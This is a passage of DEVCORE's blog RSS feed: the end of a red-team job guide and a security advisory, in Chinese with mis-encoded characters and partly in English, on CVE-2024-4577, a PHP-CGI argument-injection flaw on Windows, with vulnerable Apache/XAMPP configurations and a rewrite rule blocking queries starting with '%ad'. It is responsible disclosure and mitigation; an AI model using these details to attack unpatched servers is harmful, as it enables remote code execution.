&lt;h3 id=&quot;-ÊâæÂêå‰º¥‰∏ÄËµ∑&quot;&gt;üìå ÊâæÂêå‰º¥‰∏ÄËµ∑&lt;/h3&gt;

&lt;p&gt;Âú®Ë≥áÂÆâÈÄôÊ¢ùË∑Ø‰∏äÔºåÊâæÂà∞ÂøóÂêåÈÅìÂêàÁöÑÂ§•‰º¥‰∏ÄËµ∑Â≠∏Áøí„ÄÅ‰∏ÄËµ∑Êâì CTF„ÄÅ‰∏ÄËµ∑ÊåñÊºèÊ¥ûÁµïÂ∞çÊØîÁç®Ëá™ÂçáÁ¥ö‰æÜÁöÑÊúâÊïàÁéáÔºå‰∏ãÂàóÊ¥ªÂãïÂèØËÄÉÊÖÆÂèÉÂä†Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hitcon.org/2024/CMT/&quot;&gt;HITCON Community&lt;/a&gt;: Âπæ‰πéÊâÄÊúâË≥áÂÆâÁ§æÁæ§ÈÉΩÊúÉËÅöÈõÜÂú®ÈÄôÂÄãÁ†îË®éÊúÉÔºåÂèØ‰ª•Âú®Á†îË®éÊúÉ‰∏≠Êâæ‰∏ÄÂÄãÈÅ©ÂêàËá™Â∑±ÁöÑÁ§æÁæ§ÂèÉËàá„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://ais3.org/&quot;&gt;AIS3&lt;/a&gt;: ËÅöÈõÜÂè∞ÁÅ£Âπæ‰πéÊâÄÊúâÂ∞çË≥áÂÆâÊúâËààË∂£ÁöÑÂú®Â≠∏Áîü„ÄÇÊªøÊúâÊ©üÊúÉÂú®ÈÄôÈÇäË™çË≠òÂøóÂêåÈÅìÂêàÁöÑÊúãÂèã„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://forms.gle/3HHuBVzjHCwfAnGc8&quot;&gt;Âè∞ÁÅ£Â•ΩÂé≤Èß≠ Deep Hacking ËÆÄÊõ∏ÊúÉ&lt;/a&gt;: ÂÖ®Âè∞ÁÅ£Êé¢Ë®éË≥áÂÆâÊúÄÊ∑±ÊúÄÊâéÂØ¶ÁöÑËÆÄÊõ∏ÊúÉ‰πã‰∏ÄÔºåÂèÉÂä†ÁµïÂ∞çÂèØ‰ª•ÊèêÊòáË¶ñÈáé„ÄÅ‰πüËÉΩË™çË≠òÂêÑÁ®ÆÈ´òÊâã„ÄÇÂÖßÂÆπÂÅè Binary ‰ΩÜÁõÆÂâçÊº∏Êº∏Âú®ËΩâÂûã‰∏≠ÔºåÂ∏åÊúõ‰∏çÂàÜÈ°û‰ª•ÊåñÊéòÊºèÊ¥ûÁÇ∫‰∏ª„ÄÇ&lt;/li&gt;
  &lt;li&gt;DEVCORE ÂØ¶ÁøíÁîüË®àÁï´Ôºö ÊØèÂπ¥‰∏ÄÊúà‰∏≠Âíå‰∏ÉÊúà‰∏≠ÊúÉÊãõÁîüÔºåÂ¶ÇÊûúÁõÆÁöÑÊòØÊáâÂæµ DEVCOREÔºåÂèÉÂä†Ë®àÁï´ÂïèÂ∞éÂ∏´ÊáâË©≤ÊòØÊúÄÂø´ÁöÑ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â¶ÇÊûú‰Ω†ÊÉ≥Áü•ÈÅìÊõ¥Â§öË≥áÊ∫êÔºå&lt;a href=&quot;https://github.com/Ice1187/TW-Security-and-CTF-Resource&quot;&gt;Âè∞ÁÅ£Ë≥áÂÆâ / CTF Â≠∏ÁøíË≥áÊ∫êÊï¥ÁêÜ&lt;/a&gt; Êï¥ÁêÜÁöÑË≥áÊ∫êÂÄºÂæóÂèÉËÄÉ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;-Â∞èÁµê&quot;&gt;üöÄ Â∞èÁµê&lt;/h2&gt;

&lt;p&gt;Êú¨ÁØáÊåáÂçóÂàÜÊàêÂÖ©ÈÉ®ÂàÜÔºöÂâçÂçäÈÉ®‰∏ªË¶ÅÂú®Áµ¶ÊáâÂæµËÄÖ‰∏Ä‰∫õÂ∞èÊèêÈÜíÔºåÂ∏åÊúõÊáâÂæµËÄÖËÉΩÊääÊúÄÂ•ΩÁöÑ‰∏ÄÈù¢ÂëàÁèæÂá∫‰æÜ„ÄÇÂæåÂçäÈÉ®Êèê‰æõ‰∏ÄÂÄãÂ≠∏ÁøíÁöÑËÑàÁµ°ÔºåÂ∏åÊúõÁµ¶ÈÇÑÂú®Â≠∏ÁøíÈöéÊÆµÁöÑ‰∫∫‰∏ÄÂÄãÊØîËºÉÊ∏ÖÊ•öÁöÑÊñπÂêë„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÁµÇÔºåÊàëÂÄëÈÉΩÂ∏åÊúõÂè∞ÁÅ£ÊúâË∂ä‰æÜË∂äÂ§öÁÜ±ÊÑõÊäÄË°ìÁöÑ‰∫∫ÈÄ≤ÂÖ•Ë≥áÂÆâÁî¢Ê•≠„ÄÇÂ∏åÊúõÔºåÊú™‰æÜËÉΩÊåÅÁ∫åÂú®Ë≥áÂÆâÈ†òÂüüÁúãË¶ãÊ≠£Âú®Èñ±ËÆÄÁöÑ‰Ω†„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist/</link>
                <guid>https://devco.re/blog/2024/07/09/guide-to-applying-for-red-team-specialist</guid>
                <pubDate>Tue, 09 Jul 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Ë≥áÂÆâÈÄöÂ†±ÔºöPHP ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°å (CVE-2024-4577) - PHP CGI ÂèÉÊï∏Ê≥®ÂÖ•Âº±Èªû</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êà¥Â§´ÂØáÁàæÁ†îÁ©∂ÂúòÈöäÂú®ÈÄ≤Ë°å&lt;a href=&quot;https://devco.re/research/overview/&quot;&gt;ÂâçÁûªÊîªÊìäÁ†îÁ©∂&lt;/a&gt;ÊúüÈñìÔºåÁôºÁèæ PHP Á®ãÂºèË™ûË®ÄÂ≠òÂú®ÈÅ†Á´ØÁ®ãÂºèÁ¢ºÂü∑Ë°åÂº±ÈªûÔºåÂü∫Êñº PHP Âú®Á∂≤Á´ôÁîüÊÖã‰ΩøÁî®ÁöÑÂª£Ê≥õÊÄß‰ª•ÂèäÊ≠§Âº±Èªû‰πãÊòìÈáçÁèæÊÄßÔºåÁ†îÁ©∂ÂúòÈöäÂ∞áÊ≠§Âº±ÈªûÊ®ôË®òÁÇ∫Âö¥Èáç„ÄÅ‰∏¶Âú®Á¨¨‰∏ÄÊôÇÈñìÂõûÂ†±Áµ¶ PHP ÂÆòÊñπ„ÄÇÂÆòÊñπÂ∑≤Âú® 2024/06/06 Áôº‰Ωà‰øÆÂæ©ÁâàÊú¨ÔºåË©≥Á¥∞ÊôÇÁ®ãÂèØÂèÉÈñ±&lt;a href=&quot;#ÊºèÊ¥ûÂõûÂ†±ÊôÇÈñìËª∏&quot;&gt;ÊºèÊ¥ûÂõûÂ†±ÊôÇÈñìËª∏&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÊèèËø∞&quot;&gt;ÊºèÊ¥ûÊèèËø∞&lt;/h2&gt;

&lt;p&gt;PHP Á®ãÂºèË™ûË®ÄÂú®Ë®≠Ë®àÊôÇÂøΩÁï• Windows ‰ΩúÊ•≠Á≥ªÁµ±ÂÖßÈÉ®Â∞çÂ≠óÂÖÉÁ∑®Á¢ºËΩâÊèõÁöÑ &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; ÁâπÊÄßÔºåÂ∞éËá¥Êú™Ë™çË≠âÁöÑÊîªÊìäËÄÖÂèØÈÄèÈÅéÁâπÂÆöÁöÑÂ≠óÂÖÉÂ∫èÂàóÁπûÈÅéËàäÊúâ &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; ÁöÑ‰øùË≠∑ÔºõÈÄèÈÅéÂèÉÊï∏Ê≥®ÂÖ•Á≠âÊîªÊìäÂú®ÈÅ†Á´Ø PHP ‰º∫ÊúçÂô®‰∏äÂü∑Ë°å‰ªªÊÑèÁ®ãÂºèÁ¢º„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;ÂΩ±ÈüøÁØÑÂúç&quot;&gt;ÂΩ±ÈüøÁØÑÂúç&lt;/h2&gt;

&lt;p&gt;Ê≠§Âº±Èªû&lt;strong&gt;ÂΩ±ÈüøÂÆâË£ùÊñº Windows ‰ΩúÊ•≠Á≥ªÁµ±‰∏äÊâÄÊúâÁöÑ PHP ÁâàÊú¨&lt;/strong&gt;ÔºåË©≥ÊÉÖÂèØÂèÉÁÖß‰∏ãË°®:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áî±Êñº PHP 8.0 ÂàÜÊîØ„ÄÅPHP 7 ‰ª•Âèä PHP 5 ÂÆòÊñπÂ∑≤&lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;‰∏çÂÜçÁ∂≠Ë≠∑&lt;/a&gt;ÔºåÁ∂≤Á´ôÁÆ°ÁêÜÂì°ÂèØÂèÉËÄÉ&lt;a href=&quot;#Â¶Ç‰ΩïÁ¢∫Ë™çËá™Â∑±ÊòìÈÅ≠ÂèóÊîªÊìä&quot;&gt;Â¶Ç‰ΩïÁ¢∫Ë™çËá™Â∑±ÊòìÈÅ≠ÂèóÊîªÊìä&lt;/a&gt;Á´†ÁØÄÔºå‰∏¶Êñº&lt;a href=&quot;#‰øÆË£úÂª∫Ë≠∞&quot;&gt;‰øÆË£úÂª∫Ë≠∞&lt;/a&gt;ÊâæÂà∞Êö´ÊôÇÁ∑©Ëß£Êé™ÊñΩ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÁ¢∫Ë™çËá™Â∑±ÊòìÈÅ≠ÂèóÊîªÊìä&quot;&gt;Â¶Ç‰ΩïÁ¢∫Ë™çËá™Â∑±ÊòìÈÅ≠ÂèóÊîªÊìä?&lt;/h2&gt;

&lt;p&gt;Â∞çÊñºÂ∏∏Ë¶ã‰πã Apache HTTP Server Âä†‰∏ä PHP ÁµÑÂêàÔºåÁ∂≤Á´ôÁÆ°ÁêÜÂì°ÂèØÈÄèÈÅéÊ≠§ÊñáÁ´†ÂàóÂá∫‰πãÂÖ©ÂÄãÊñπÂºèÁ¢∫Ë™ç‰º∫ÊúçÂô®ÊòØÂê¶ÊòìË¢´ÊîªÊìä„ÄÇÂÖ∂‰∏≠ÔºåÊÉÖÂ¢É‰∫å‰πüÊòØ &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt; ÂÆâË£ùÊôÇÁöÑÈ†êË®≠Ë®≠ÂÆöÔºåÂõ†Ê≠§&lt;strong&gt;ÊâÄÊúâÁâàÊú¨ÁöÑ XAMPP for Windows ÂÆâË£ù‰πüÈ†êË®≠ÂèóÊ≠§Âº±ÈªûÂΩ±Èüø„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Âú®Êú¨ÊñáÊí∞ÂØ´Áï∂‰∏ãÂ∑≤È©óË≠âÁï∂ Windows ‰ΩúÊ•≠Á≥ªÁµ±Âü∑Ë°åÊñº‰∏ãÂàóË™ûÁ≥ªÊôÇÔºå&lt;strong&gt;Êú™ÊéàÊ¨äÁöÑÊîªÊìäËÄÖÂèØÁõ¥Êé•Âú®ÈÅ†Á´Ø‰º∫ÊúçÂô®‰∏äÂü∑Ë°å‰ªªÊÑèÁ®ãÂºèÁ¢º&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÁπÅÈ´î‰∏≠Êñá (Â≠óÁ¢ºÈ†Å 950)&lt;/li&gt;
  &lt;li&gt;Á∞°È´î‰∏≠Êñá (Â≠óÁ¢ºÈ†Å 936)&lt;/li&gt;
  &lt;li&gt;Êó•Êñá (Â≠óÁ¢ºÈ†Å 932)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Â∞çÊñºÂÖ∂ÂÆÉÂü∑Ë°åÂú®Ëã±Êñá„ÄÅÈüìÊñá„ÄÅË•øÊ≠êË™ûÁ≥ª‰πã Windows ‰ΩúÊ•≠Á≥ªÁµ±ÔºåÁî±Êñº PHP ‰ΩøÁî®ÊÉÖÂ¢ÉÂª£Ê≥õ„ÄÅÊö´ÁÑ°Ê≥ïÂÆåÂÖ®ÂàóËàâ‰∏¶ÊéíÈô§ÂÖ∂Âà©Áî®ÊÉÖÂ¢ÉÔºåÂõ†Ê≠§ÈÇÑÊòØÂª∫Ë≠∞‰ΩøÁî®ËÄÖÂÖ®Èù¢Áõ§ÈªûË≥áÁî¢„ÄÅÁ¢∫Ë™ç‰ΩøÁî®ÊÉÖÂ¢É‰∏¶Êõ¥Êñ∞ PHP Ëá≥ÊúÄÊñ∞ÁâàÊú¨Á¢∫‰øùËê¨ÁÑ°‰∏ÄÂ§±ÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;ÊÉÖÂ¢É‰∏Ä-Â∞á-php-Ë®≠ÂÆöÊñº-cgi-Ê®°Âºè‰∏ãÂü∑Ë°å&quot;&gt;ÊÉÖÂ¢É‰∏Ä: Â∞á PHP Ë®≠ÂÆöÊñº CGI Ê®°Âºè‰∏ãÂü∑Ë°å&lt;/h3&gt;

&lt;p&gt;Âú® Apache Httpd Ë®≠ÂÆöÊ™î‰∏≠ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Action&lt;/code&gt; Ë™ûÊ≥ïÂ∞áÂ∞çÊáâÁöÑ HTTP Ë´ãÊ±Ç‰∫§Áµ¶ PHP-CGI Âü∑Ë°åÊ™îËôïÁêÜÊôÇÔºåÂèóÊ≠§Âº±ÈªûÂΩ±ÈüøÔºåÂ∏∏Ë¶ãË®≠ÂÆöÂåÖÂê´‰ΩÜ‰∏çÈôêÊñº:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;AddHandler&lt;/span&gt; cgi-script .php
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Êàñ&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;\.php$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; application/x-httpd-php-cgi
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;Action&lt;/span&gt; application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ÊÉÖÂ¢É‰∫å-Â∞á-php-Âü∑Ë°åÊ™îÊö¥Èú≤Âú®Â§ñ-xampp-È†êË®≠ÂÆâË£ùË®≠ÂÆö&quot;&gt;ÊÉÖÂ¢É‰∫å: Â∞á PHP Âü∑Ë°åÊ™îÊö¥Èú≤Âú®Â§ñ (XAMPP È†êË®≠ÂÆâË£ùË®≠ÂÆö)&lt;/h3&gt;

&lt;p&gt;Âç≥‰ΩøÊú™Ë®≠ÂÆö PHP Êñº CGI Ê®°Âºè‰∏ãÂü∑Ë°åÔºåÂÉÖÂ∞á PHP Âü∑Ë°åÊ™îÊö¥Èú≤Âú® CGI ÁõÆÈåÑ‰∏ã‰πüÂèóÊ≠§Âº±ÈªûÂΩ±ÈüøÔºåÂ∏∏Ë¶ãÊÉÖÊ≥ÅÂåÖÂê´‰ΩÜ‰∏çÈôêÊñº:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Â∞á &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php.exe&lt;/code&gt; Êàñ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-cgi.exe&lt;/code&gt; Ë§áË£ΩÂà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; ÁõÆÈåÑ‰∏≠&lt;/li&gt;
  &lt;li&gt;Â∞á PHP ÂÆâË£ùÁõÆÈåÑÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt; Êö¥Èú≤Âà∞Â§ñÔºåÂ¶Ç:
    &lt;pre&gt;&lt;code class=&quot;language-apache2=&quot;&gt; ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;‰øÆË£úÂª∫Ë≠∞&quot;&gt;‰øÆË£úÂª∫Ë≠∞&lt;/h2&gt;

&lt;p&gt;Âº∑ÁÉàÂª∫Ë≠∞ÊâÄÊúâ‰ΩøÁî®ËÄÖÂçáÁ¥öËá≥ PHP ÂÆòÊñπÊúÄÊñ∞ÁâàÊú¨ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; Ëàá &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;ÔºåÂ∞çÊñºÁÑ°Ê≥ïÂçáÁ¥öÁöÑÁ≥ªÁµ±ÂèØÈÄèÈÅé‰∏ãÂàóÊñπÂºèÊö´ÊôÇÁ∑©Ëß£Âº±Èªû„ÄÇ&lt;/p&gt;

&lt;p&gt;Èô§Ê≠§‰πãÂ§ñÔºåÁî±Êñº PHP CGI Â∑≤ÊòØ‰∏ÄÁ®ÆÈÅéÊôÇ‰∏îÊòìÊñºÂá∫ÁèæÂïèÈ°åÁöÑÊû∂ÊßãÔºå‰πüÂª∫Ë≠∞Ë©ï‰º∞ÈÅ∑ÁßªËá≥ËºÉÁÇ∫ÂÆâÂÖ®ÁöÑ Mod-PHP„ÄÅFastCGI ÊàñÊòØ PHP-FPM Á≠âÊû∂ÊßãÂèØËÉΩÊÄß„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;1-Â∞çÁÑ°Ê≥ïÊõ¥Êñ∞-php-ÁöÑ‰ΩøÁî®ËÄÖ&quot;&gt;1. Â∞çÁÑ°Ê≥ïÊõ¥Êñ∞ PHP ÁöÑ‰ΩøÁî®ËÄÖ&lt;/h3&gt;

&lt;p&gt;ÂèØÈÄèÈÅé‰∏ãÂàó Rewrite Ë¶èÂâáÈòªÊìãÊîªÊìäÔºåË´ãÊ≥®ÊÑè&lt;strong&gt;Ê≠§‰ªΩË¶èÂâáÂè™‰ΩúÁÇ∫ÁπÅÈ´î‰∏≠Êñá„ÄÅÁ∞°È´î‰∏≠ÊñáÂèäÊó•ÊñáË™ûÁ≥ª‰∏≠ÁöÑÊö´ÊôÇÊÄßÁ∑©Ëß£Ê©üÂà∂&lt;/strong&gt;ÔºåÂØ¶Âãô‰∏ä‰ªçÂª∫Ë≠∞Êõ¥Êñ∞Âà∞Â∑≤‰øÆÂæ©ÁâàÊú¨ÊàñÊõ¥ÊîπÊû∂Êßã„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{QUERY_STRING} ^%ad [NC]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; .? - [F,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;2-Â∞ç-xampp-for-windows-‰ΩøÁî®ËÄÖ&quot;&gt;2. Â∞ç XAMPP for Windows ‰ΩøÁî®ËÄÖ&lt;/h3&gt;

&lt;p&gt;Âú®Êí∞ÂØ´Êú¨ÊñáÁöÑÁï∂‰∏ãÔºåXAMPP Â∞öÊú™ÈáùÂ∞çÊ≠§ÊºèÊ¥ûÈáãÂá∫Áõ∏Â∞çÊáâÁöÑÊõ¥Êñ∞ÂÆâË£ùÊ™îÔºåÂ¶ÇÁ¢∫Ë™çËá™Ë∫´ÁöÑ XAMPP ‰∏¶ÁÑ°‰ΩøÁî®Âà∞ PHP CGI ‰πãÂäüËÉΩÔºåÂèØÈÄèÈÅé‰øÆÊîπ‰∏ãÂàó Apache Httpd Ë®≠ÂÆöÊ™î‰ª•ÈÅøÂÖçÊö¥Èú≤Âú®Âº±Èªû‰∏≠:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;C:/xampp/apache/conf/extra/httpd-xampp.conf&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ÊâæÂà∞Áõ∏Â∞çÊáâÁöÑË®≠ÂÆöË°åÊï∏:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;ScriptAlias&lt;/span&gt; /php-cgi/ &quot;C:/xampp/php/&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰∏¶Â∞áÂÖ∂Ë®ªËß£:&lt;/p&gt;
&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ÊºèÊ¥ûÂõûÂ†±ÊôÇÈñìËª∏&quot;&gt;ÊºèÊ¥ûÂõûÂ†±ÊôÇÈñìËª∏&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2024/05/07 - DEVCORE ÈÄèÈÅé PHP ÂÆòÊñπÂº±ÈªûÈÄöÂ†±È†ÅÈù¢ÂõûÂ†±Ê≠§ÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;2024/05/07 - PHP ÈñãÁôºËÄÖÁ¢∫Ë™çÂº±Èªû‰∏¶Âº∑Ë™øË¶ÅÁõ°Âø´‰øÆÂæ©„ÄÇ&lt;/li&gt;
  &lt;li&gt;2024/05/16 - PHP ÈñãÁôºËÄÖÈáãÂá∫Á¨¨‰∏ÄÁâà‰øÆÂæ©‰∏¶Â∞ãÊ±ÇÂª∫Ë≠∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;2024/05/18 - PHP ÈñãÁôºËÄÖÈáãÂá∫Á¨¨‰∫åÁâà‰øÆÂæ©‰∏¶Â∞ãÊ±ÇÂª∫Ë≠∞„ÄÇ&lt;/li&gt;
  &lt;li&gt;2024/05/20 - PHP ÈÄ≤ÂÖ•Êñ∞ÁâàÊú¨ÁôºÂ∏ÉÊ∫ñÂÇô„ÄÇ&lt;/li&gt;
  &lt;li&gt;2024/06/06 - PHP ÁôºÂ∏ÉÊñ∞ÁâàÊú¨ &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.3.8&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.2.20&lt;/a&gt; Ëàá &lt;a href=&quot;https://www.php.net/downloads&quot;&gt;8.1.29&lt;/a&gt;„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ÂèÉËÄÉË≥áÊñô&quot;&gt;ÂèÉËÄÉË≥áÊñô&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-25jv&quot;&gt;PHP Security Advisory - PHP RCE: A Bypass of CVE-2012-1823, Argument Injection in PHP-CGI&lt;/a&gt; (to be announced)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;MS-UCODEREF - Windows Protocols Unicode Reference&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CERT/CC VU#520827 - PHP-CGI query string parameter vulnerability&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/</link>
                <guid>https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability</guid>
                <pubDate>Thu, 06 Jun 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Security Alert: CVE-2024-4577 - PHP CGI Argument Injection Vulnerability</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;During DEVCORE‚Äôs &lt;a href=&quot;https://devco.re/en/research/overview/&quot;&gt;continuous offensive research&lt;/a&gt;, our team discovered a remote code execution vulnerability in PHP. Due to the widespread use of the programming language in the web ecosystem and the ease of exploitability, DEVCORE classified its severity as critical, and promptly reported it to the PHP official team. The official team released a patch on 2024/06/06. Please refer to the &lt;a href=&quot;#Timeline&quot;&gt;timeline&lt;/a&gt; for disclosure details.&lt;/p&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;While implementing PHP, the team did not notice the &lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8&quot;&gt;Best-Fit&lt;/a&gt; feature of encoding conversion within the Windows operating system. This oversight allows unauthenticated attackers to bypass the previous protection of &lt;a href=&quot;https://www.kb.cert.org/vuls/id/520827&quot;&gt;CVE-2012-1823&lt;/a&gt; by specific character sequences. Arbitrary code can be executed on remote PHP servers through the argument injection attack.&lt;/p&gt;

&lt;h2 id=&quot;impact&quot;&gt;Impact&lt;/h2&gt;

&lt;p&gt;This vulnerability &lt;strong&gt;affects all versions of PHP installed on the Windows operating system&lt;/strong&gt;. Please refer to the table below for details:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;PHP 8.3 &amp;lt; 8.3.8&lt;/li&gt;
  &lt;li&gt;PHP 8.2 &amp;lt; 8.2.20&lt;/li&gt;
  &lt;li&gt;PHP 8.1 &amp;lt; 8.1.29&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since the branch of PHP 8.0, PHP 7, and PHP 5 are &lt;a href=&quot;https://www.php.net/eol.php&quot;&gt;End-of-Life&lt;/a&gt;, and are no longer maintained anymore, server admins can refer to the &lt;a href=&quot;#am-i-vulnerable&quot;&gt;Am I Vulnerable&lt;/a&gt; section to find temporary patch recommendations in the &lt;a href=&quot;#mitigation-measure&quot;&gt;Mitigation Measure&lt;/a&gt; section.&lt;/p&gt;

&lt;h2 id=&quot;am-i-vulnerable&quot;&gt;Am I Vulnerable?&lt;/h2&gt;

&lt;p&gt;For the usual case of combinations like Apache HTTP Server and PHP, server administrators can use the two methods listed in this article to determine whether their servers are vulnerable or not. It‚Äôs notable to address that Scenario-2 is also the default configuration for &lt;a href=&quot;https://www.apachefriends.org/&quot;&gt;XAMPP for Windows&lt;/a&gt;, so &lt;strong&gt;all versions of XAMPP installations on Windows are vulnerable by default&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;As of this writing, it has been verified that when the Windows is running in the following locales, &lt;strong&gt;an unauthorized attacker can directly execute arbitrary code on the remote server&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
